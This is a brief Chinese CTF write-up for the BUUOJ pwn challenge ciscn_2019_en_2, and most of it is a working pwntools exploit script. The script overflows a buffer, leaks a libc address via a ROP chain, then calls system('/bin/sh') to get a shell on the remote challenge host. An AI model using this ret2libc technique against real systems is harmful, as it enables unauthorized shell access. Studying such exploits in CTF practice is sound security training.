---
title: "Ciscn_2019_en_2"
description: ""
date: 2023-04-07T00:20:36+08:00
lastmod: 2023-04-07T00:20:36+08:00
draft: false
images: []
type: docs
weight: 988
toc: true
---

## 0x01 分析

和ciscn\_2019\_c\_1差不多，就加密变了一点

## 0x02 Exploit

```python
from pwn import*
from LibcSearcher import*
# context.log_level = 'debug'
# o = process("./pwn")
o = remote("node4.buuoj.cn", 25752)
elf = ELF("./pwn")
# libc = elf.libc
puts_plt = elf.plt['puts']
gets_got = elf.got['gets']
encrypt = elf.sym['encrypt']
pop_rdi = 0x0000000000400c83

# leak libc
payload = b'aaaaaaa\x00' + b'a'*80
payload += p64(pop_rdi) +p64(gets_got) + p64(puts_plt) + p64(encrypt)
o.sendline(b'1')
o.sendline(payload)
o.recvuntil("ooooooo\n")    # aaaaaaa加密后的结果
gets_addr = u64(o.recv(6) + b"\x00\x00")
libc = LibcSearcher("gets", gets_addr)
libc_base = gets_addr - libc.dump("gets")
log.info(hex(libc_base))
sys_addr = libc_base + libc.dump("system")
bin_sh = libc_base + libc.dump("str_bin_sh")

# attack
payload = b'aaaaaaa\x00' + b'a'*80
payload += p64(pop_rdi) + p64(bin_sh) +  p64(0x400B27) + p64(sys_addr)
o.sendline(payload)

o.interactive()

```

![9cc1877c63fa60162b541630a52b19c1](images/9cc1877c63fa60162b541630a52b19c1.png)  

自行调试
